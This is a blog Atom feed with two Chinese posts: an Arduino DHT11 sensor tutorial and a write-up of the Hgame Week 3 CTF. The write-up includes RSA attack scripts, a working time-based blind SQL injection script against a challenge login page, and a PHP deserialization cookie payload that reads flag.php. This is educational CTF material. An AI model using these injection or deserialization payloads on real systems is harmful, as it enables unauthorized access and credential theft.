<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Wu JunYi&#39;Blog</title>
  
  
  <link href="https://wujunyi792.github.io/atom.xml" rel="self"/>
  
  <link href="https://wujunyi792.github.io/"/>
  <updated>2021-02-22T17:11:40.811Z</updated>
  <id>https://wujunyi792.github.io/</id>
  
  <author>
    <name>Wujunyi</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Arduino 温湿度传感器 DHT11</title>
    <link href="https://wujunyi792.github.io/2021/02/22/Arduino-%E6%B8%A9%E6%B9%BF%E5%BA%A6%E4%BC%A0%E6%84%9F%E5%99%A8-DHT11/"/>
    <id>https://wujunyi792.github.io/2021/02/22/Arduino-%E6%B8%A9%E6%B9%BF%E5%BA%A6%E4%BC%A0%E6%84%9F%E5%99%A8-DHT11/</id>
    <published>2021-02-22T15:35:08.000Z</published>
    <updated>2021-02-22T17:11:40.811Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>这里介绍关于 DHT11 温湿度传感器在 arduino 上的使用方法，附头文件</p></blockquote><a id="more"></a><h1 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h1><h2 id="–单线串口"><a href="#–单线串口" class="headerlink" title="–单线串口"></a>–单线串口</h2><p>所谓单线串口（全称为<strong>单线异步串行通讯接口</strong>），不同于标准串口的两根数据线（ Txd 和 Rxd ），单线串口只有<strong>一根数据线</strong>来<strong>同时兼备发送和接收功能</strong>，系统的数据交换、控制均由单总线完成。因此，单线串口采用半双工的通讯方式（能双向通信，但一方发送信息的时候另一方不能发送信息，毕竟只有一根线）。单总线通常要求外接一个上拉电阻，以确保当总线闲置时，其状态为高电平，如图以 DHT11为例。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210223000826.png" alt="image-20210223000826563" style="zoom:50%;" /><p>还可以在 VDD 和 GND 直接加一个电容 ，来去耦滤波。</p><h2 id="–单总线数据位的定义"><a href="#–单总线数据位的定义" class="headerlink" title="–单总线数据位的定义"></a>–单总线数据位的定义</h2><p>这里以 DHT11 来说明。（科协给的数据手册确实有点意思，上面讲的比较详细，，这里挑重点说明）</p><p>DHT11 和主机的通信，一次传送 40 位数据，高位先出，一次通讯 4ms 左右。</p><p>数据格式：8bit<strong>湿度整数数据</strong> + 8bit<strong>湿度小数数据</strong> + 8bit<strong>温度整数数据</strong> + 8bit<strong>温度小数数据</strong> + 8bit<strong>校验位</strong></p><p>校验位等于 “8bit湿度整数数据+8bit湿度小数数据+8bit温度整数数据+8bit温度小数数据” 所得结果的末8位。</p><p>通讯过程：</p><p>主机发送一次开始信号后，DHT11 从低功耗模式转换到高速模式，等待主机开始信号结束后，DHT11 发送响应信号，送出40bit的数据，并触发一次信号采集，用户可选择读取部分数据，DHT11 采集数据后转换到低速模式。<strong>所以我们每一次读取的数据是上一次的采集结果</strong></p><p>时序图：</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210223002611.png" alt="数据时序图" style="zoom:50%;" /><p>起始信号：微处理器把数据总线（SDA）拉低一段时间至少 18ms（最大不得超过30ms）。通知传感器准备数据。</p><p>响应信号：传感器把数据总线（SDA）拉低 83μs，再接高 87μs 以响应主机的起始信号。</p><p>数据：传感器一次性从数据总线（SDA）串出40 位数据，高位先出</p><p>最后从机拉低 50μs ，随后总线由上拉电阻拉高释放总线进入空闲状态。</p><h2 id="–相对湿度"><a href="#–相对湿度" class="headerlink" title="–相对湿度"></a>–相对湿度</h2><p>Relative humidity is the amount of water vapor in air vs. the saturation point of water vapor in air. At the saturation point, water vapor starts to condense and accumulate on surfaces forming dew.</p><p>The saturation point changes with air temperature. Cold air can hold less water vapor before it becomes saturated, and hot air can hold more water vapor before it becomes saturated.</p><p>简单点说，相对湿度就是空气中水蒸气的量与空气中水蒸气的饱和点（饱和点：水蒸气开始凝结并积聚在形成露水的表面，其值随气温变化）的比值。</p><p>相对湿度计算公式：</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210223004500.png" alt="image-20210223004500927" style="zoom:50%;" /><p>100％RH 下，会发生凝结；0％ 下，空气完全干燥。</p><h2 id="–数字温湿度传感器及原理"><a href="#–数字温湿度传感器及原理" class="headerlink" title="–数字温湿度传感器及原理"></a>–数字温湿度传感器及原理</h2><p>温度传感器组件有很多种，像热敏电阻、DS18B20 、TMP36 、LM335A 等。DHT11 其实是一款结合温湿度传感器及信号处理 IC 的感测模块，外观如下。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210223003652.png" alt="image-20210223003652245" style="zoom:50%;" /><p>连接 arduino 时。建议在电源与数据输出脚连接一个 10kΩ 电阻，电源和接地脚之间接一个 0.1μF(104) 电容，原因在上文有提及。怕麻烦可以直接买最右侧的。</p><p>那么它是如何从测量温度和湿度的？</p><p>DHT11 通过测量两个电极之间的电阻来检测水蒸气。两个电极之间的电阻变化与相对湿度成正比。较高的相对湿度会降低电极之间的电阻，而较低的相对湿度会增加电极之间的电阻。</p><p>DHT11 通过 <a href="https://www.circuitbasics.com/arduino-thermistor-temperature-sensor-tutorial">NTC温度传感器</a>（热敏电阻）来测量温度 。</p><h1 id="设计方案"><a href="#设计方案" class="headerlink" title="设计方案"></a>设计方案</h1><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210223005003.png" alt="image-20210223005003510" style="zoom:67%;" /><h1 id="材料清单"><a href="#材料清单" class="headerlink" title="材料清单"></a>材料清单</h1><table><thead><tr><th>材料</th><th>数量</th></tr></thead><tbody><tr><td>Arduino Uno</td><td>1</td></tr><tr><td>DHT11</td><td>1</td></tr><tr><td>10kΩ 电阻（三脚的 DHT11不需要，但四脚的 DHT11 也非强制需要）</td><td>1</td></tr><tr><td>导线</td><td>3</td></tr></tbody></table><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>这里需要引入 DHT11 第三方库。<a href="https://www.circuitbasics.com/wp-content/uploads/2015/10/DHTLib.zip">下载链接</a></p><p>打开压缩包有两个文件</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210223005614.png" alt="image-20210223005614566" style="zoom:67%;" /><p>找到 Arduino 的 libraries 地址，一般默认会在 C:\Documents\Arduino\libraries （因人而异），里面有不少已经安装好的官方库。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210223005902.png" alt="image-20210223005902472" style="zoom:40%;" /><p>我们新建一个文件夹<code>dth11</code>，名字随意取，不一定要我这个。</p><p>把压缩包里的两个文件复制进去，大功告成。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210223010041.png" alt="image-20210223010041145" style="zoom:50%;" /><p>测试程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;DHT.h&gt;        //引用dht11库文件，使得下面可以调用相关参数</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DHTPIN 8        <span class="comment">//定义温湿度针脚号为8号引脚</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DHTTYPE DHT11   <span class="comment">// DHT 11   实例化一个对象</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DHT <span class="title">dht</span><span class="params">(DHTPIN, DHTTYPE)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Serial.begin(<span class="number">9600</span>);                      <span class="comment">//设置波特率参数</span></span><br><span class="line">    Serial.println(F(<span class="string">&quot;数据接收开始！&quot;</span>));</span><br><span class="line">    dht.begin();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    delay(<span class="number">2000</span>);        <span class="comment">//在测量之间等待几秒钟，因为测量速度超级慢。</span></span><br><span class="line">    <span class="keyword">float</span> h = dht.readHumidity();</span><br><span class="line">    <span class="comment">//读取温度为摄氏度（默认值）</span></span><br><span class="line">    <span class="keyword">float</span> t = dht.readTemperature();</span><br><span class="line">    <span class="comment">//检查是否有任何读取失败并提前退出（再试一次）。</span></span><br><span class="line">    <span class="keyword">if</span> (isnan(h) || isnan(t)) &#123;</span><br><span class="line">        Serial.println(F(<span class="string">&quot;无法从DHT传感器读取！&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//  Humidity湿度</span></span><br><span class="line">    Serial.print(F(<span class="string">&quot;Humidity: &quot;</span>));</span><br><span class="line">    Serial.print(h);</span><br><span class="line"><span class="comment">//Temperature 温度</span></span><br><span class="line">    Serial.print(F(<span class="string">&quot;%  Temperature: &quot;</span>));</span><br><span class="line">    Serial.print(t);</span><br><span class="line">    Serial.print(F(<span class="string">&quot;°C &quot;</span>));</span><br><span class="line">    Serial.print(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="成果展示"><a href="#成果展示" class="headerlink" title="成果展示"></a>成果展示</h1><p>这里不打算拍视频了。</p><p>运行一切正常，随意拔出一根线随即输出 ”无法从DHT传感器读取！“</p><p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210223011114.png" alt="image-20210223011114797"></p><p>侵删</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;这里介绍关于 DHT11 温湿度传感器在 arduino 上的使用方法，附头文件&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="arduino" scheme="https://wujunyi792.github.io/categories/arduino/"/>
    
    
    <category term="arduino" scheme="https://wujunyi792.github.io/tags/arduino/"/>
    
    <category term="单片机" scheme="https://wujunyi792.github.io/tags/%E5%8D%95%E7%89%87%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Hgame Week3 Writeup</title>
    <link href="https://wujunyi792.github.io/2021/02/21/Hgame-Week3-Writeup/"/>
    <id>https://wujunyi792.github.io/2021/02/21/Hgame-Week3-Writeup/</id>
    <published>2021-02-21T08:12:01.000Z</published>
    <updated>2021-02-21T14:33:36.356Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>Week 3 巨难</p></blockquote><a id="more"></a><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="–LikiPrime"><a href="#–LikiPrime" class="headerlink" title="–LikiPrime"></a>–LikiPrime</h2><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210221162459.png" alt="image-20210221162452823" style="zoom:50%;" /><p>这题应该是最 ez 的了。</p><p>首先去[factordb.com](<a href="http://factordb.com/index.php%EF%BC%89%E6%8A%8A">http://factordb.com/index.php）把</a> n 给分解了，运气比较好这里能成功分解，于是我们便拥有了 p 和 q，然后可以计算 p 这题就解决了。脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">c = <span class="number">747831491353896780365654517748216624798517769637260742155527</span></span><br><span class="line">n = <span class="number">882564595536224140639625987659416029426239230804614613279163</span></span><br><span class="line"><span class="comment"># n = int(&quot;&quot;,16)</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="comment"># e = int(&quot;&quot;,16)</span></span><br><span class="line">q = <span class="number">1029224947942998075080348647219</span></span><br><span class="line">p = <span class="number">857504083339712752489993810777</span></span><br><span class="line"></span><br><span class="line">d = libnum.invmod(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)  <span class="comment"># m 的十进制形式</span></span><br><span class="line">string = long_to_bytes(m)  <span class="comment"># m明文</span></span><br><span class="line">print(string)  <span class="comment"># 结果为 b‘ m ’ 的形式</span></span><br><span class="line"><span class="comment">#b&#x27;hgame&#123;w0w~yOU_kNoW+R5@!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="–HappyNewYear"><a href="#–HappyNewYear" class="headerlink" title="–HappyNewYear!!"></a>–HappyNewYear!!</h2><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210221163649.png" alt="image-20210221163649635" style="zoom:50%;" /><p>这题也考的是 RSA，根据描述可知，有消息相同，然后打开文件发现 e=3，e太小了。</p><p>在 Google 上逛了半天，了解了不少 RSA 破解算法，锁定了一个叫<strong>低加密指数广播攻击</strong>的方法，该方法适用于<strong>加密指数<code>e</code>比较低，并且使用了相同的加密指数<code>e</code>给若干个接收者发送相同的信息</strong>的情况，适用于本题。</p><p>但哪几个消息是相同的？总共给了七组数据，他们之间有 128 种组合，所以必须先用脚本得出所有组合。（最开始直接把七组数据进行低加密指数广播攻击的脚本中，发现毫无结果，全是乱码，后来才意识到又的消息应该不一样）</p><p>这里要用到 gmpy 库，但只支持 python2，所以我又不得不安装了python2</p><p>那么最终脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2.7</span></span><br><span class="line"><span class="keyword">import</span> gmpy</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boradcast_fuzz</span>(<span class="params">question, e</span>):</span><span class="comment">#广播攻击</span></span><br><span class="line">    N = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(question)):</span><br><span class="line">        N *= question[i][<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">    N_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(question)):</span><br><span class="line">        N_list.append(N / question[i][<span class="string">&#x27;n&#x27;</span>])</span><br><span class="line">    t_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(question)):</span><br><span class="line">        t_list.append(<span class="built_in">int</span>(gmpy2.invert(N_list[i], question[i][<span class="string">&#x27;n&#x27;</span>])))</span><br><span class="line">    <span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(question)):</span><br><span class="line">        <span class="built_in">sum</span> = (<span class="built_in">sum</span> + question[i][<span class="string">&#x27;c&#x27;</span>] * t_list[i] * N_list[i]) % N</span><br><span class="line">    <span class="built_in">sum</span> = gmpy.root(<span class="built_in">sum</span>, e)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># return libnum.n2s(sum)</span></span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(<span class="built_in">sum</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getArraySubSet</span>(<span class="params">originArray</span>):</span><span class="comment">#获得子集</span></span><br><span class="line">    result = [[]]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(originArray)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">            result.append(result[j] + [originArray[i]])</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n0 = </span><br><span class="line">c0 = </span><br><span class="line">n1 = </span><br><span class="line">c1 = </span><br><span class="line">n2 = </span><br><span class="line">c2 = </span><br><span class="line">n3 =</span><br><span class="line">c3 = </span><br><span class="line">n4 =</span><br><span class="line">c4 =</span><br><span class="line">n5 =</span><br><span class="line">c5 =</span><br><span class="line">n6 =</span><br><span class="line">c6 =</span><br><span class="line"></span><br><span class="line">originArray = [</span><br><span class="line">    &#123;<span class="string">&#x27;n&#x27;</span>: n0, <span class="string">&#x27;c&#x27;</span>: c0&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;n&#x27;</span>: n1, <span class="string">&#x27;c&#x27;</span>: c1&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;n&#x27;</span>: n2, <span class="string">&#x27;c&#x27;</span>: c2&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;n&#x27;</span>: n3, <span class="string">&#x27;c&#x27;</span>: c3&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;n&#x27;</span>: n4, <span class="string">&#x27;c&#x27;</span>: c4&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;n&#x27;</span>: n5, <span class="string">&#x27;c&#x27;</span>: c5&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;n&#x27;</span>: n6, <span class="string">&#x27;c&#x27;</span>: c6&#125;</span><br><span class="line">]</span><br><span class="line">subset = getArraySubSet(originArray)</span><br><span class="line">print(<span class="string">&quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> arr <span class="keyword">in</span> subset:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> arr:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    res = boradcast_fuzz(arr, <span class="number">3</span>)</span><br><span class="line">    <span class="built_in">print</span> res</span><br><span class="line">    print(<span class="string">&quot;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行得到输出</p><p><strong>提取一下有用信息：</strong></p><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br>I am afraid the dishes in the second grade are too fragrant, you will not reply my text messages,<br>so I won’t give you New Year greetings this year, I hope you don’t know how to praise, good night.</p><p>hgame{!f+y0u-pl4y_rem</p><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br>Hello Liki4:</p><p>I am afraid that there are too many blessings on the 30th night, you will not see my greetings,<br>I am afraid that the firecrackers in the first grade are too noisy, you will not hear my blessings, </p><p>@ind3r~YOu^9ot=i7}</p><p>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</p><p>然后结合一下得到 flag <code>hgame&#123;!f+y0u-pl4y_rem@ind3r~YOu^9ot=i7&#125;</code></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="–Liki-Jail"><a href="#–Liki-Jail" class="headerlink" title="–Liki-Jail"></a>–Liki-Jail</h2><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210221190856.png" alt="image-20210221190849038" style="zoom:50%;" /><p>最开始毫无想法，后来了解了下 sqlmap，然后学习了时间盲注的知识，最后试来试去在密码处发现了 sql 注入漏洞。编写 python ，把密码一位一位爆出来。</p><p>考虑到一般密码都是正常的字符，所以 ascii 码值应该都介于 30~130 之间，那么对密码的每一位都使用二分法比较，结合 if 语句，判断为真则 <code>sleep(2)</code>，以此确定密码的每一位。</p><p>程序如下：（得关VPN）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://jailbreak.liki.link/login.php&#x27;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">130</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">30</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">max</span> &gt;= <span class="built_in">min</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span> + <span class="built_in">min</span>) // <span class="number">2</span></span><br><span class="line">        print(mid)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin\\&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;/**/or/**/if(ascii(substr((select/**/group_concat(`p@ssword`)/**/from/**/u5ers),&quot;</span> + <span class="built_in">str</span>(</span><br><span class="line">                a) + <span class="string">&quot;,1))&gt;&quot;</span> + <span class="built_in">str</span>(mid) + <span class="string">&quot;,sleep(2),0)#&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        print(data[<span class="string">&#x27;username&#x27;</span>])</span><br><span class="line">        print(data[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            t1 = time.time()</span><br><span class="line">            r = requests.post(url, data=data, verify=<span class="literal">False</span>).text</span><br><span class="line">            t2 = time.time()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            t1 = time.time()</span><br><span class="line">            r = requests.post(url, data=data, verify=<span class="literal">False</span>).text</span><br><span class="line">            t2 = time.time()</span><br><span class="line">        <span class="keyword">if</span> t2 - t1 &gt; <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">max</span> == mid == <span class="built_in">min</span>:</span><br><span class="line">            result += <span class="built_in">chr</span>(mid)</span><br><span class="line">            print(<span class="built_in">str</span>(a) + <span class="string">&#x27;:&#x27;</span> + result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后得到 password ：sOme7hiNgseCretw4sHidd3n</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210221210054.png" alt="image-20210221210054377" style="zoom:50%;" /><p>最后用 admin 登录即可获得 flag</p><h2 id="–Arknights"><a href="#–Arknights" class="headerlink" title="–Arknights"></a>–Arknights</h2><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210221210652.png" alt="image-20210221210652738" style="zoom:50%;" /><p>题目说到用 git 部署到服务器，怀疑存在 .git 文件夹。通过 git_extract 获得到了网站源码。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210221211339.png" alt="image-20210221211308077" style="zoom:50%;" /><p>接下来进行代码审计，从头到尾没有没有敏感函数，但是注意到在 <strong>simulate.php</strong> 中有一串 secret_key：</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210221211617.png" alt="image-20210221211617392" style="zoom:90%;" /><p>同时 extract 函数有一个反序列化操作，说明 <strong>Data</strong> 可控。</p><p>Eval 类可以 <code>echo this-&gt;message</code>，CardsPool 类的 toString 函数可以读文件。</p><p>所以要做的就是将 Eval 类的 $msg 指向 ClassPool 类，$file 的值赋值为 $file。随后生成序列化后的字符串，再经过 base64 编码，放回到 index.php的 cookie 中，便会获得加密后的 cookie。</p><p>构造 test.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CardsPool</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cards</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span>=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Eeeeeeevallllllll</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Eeeeeeevallllllll();</span><br><span class="line"><span class="variable">$a</span>-&gt;msg = <span class="keyword">new</span> CardsPool();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$a</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>)).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>本地运行得到编码后的序列化对象：</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210221220229.png" alt="image-20210221220229827" style="zoom:50%;" /><p>本地运行网站源代码，在 extract 函数 中加一句 echo 用来输出加密后的 cookie：</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210221221541.png" alt="image-20210221221541815" style="zoom:50%;" /><p>打开 index.php ，将 cookie 改为之前 test.php 序列化后的字符串，刷新得到加密后的 cookie。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210221221815.png" alt="image-20210221221815553" style="zoom:25%;" /><p>复制 cookie，打开网站，替换cookie，刷新。</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210221221938.png" alt="image-20210221221937898" style="zoom:25%;" /><p>啥也没发生，但是查看网页源代码就出现了 flag</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20210221222041.png" alt="image-20210221222040978" style="zoom:70%;" /><p>参考文章:<br><a href="">参考链接</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;Week 3 巨难&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
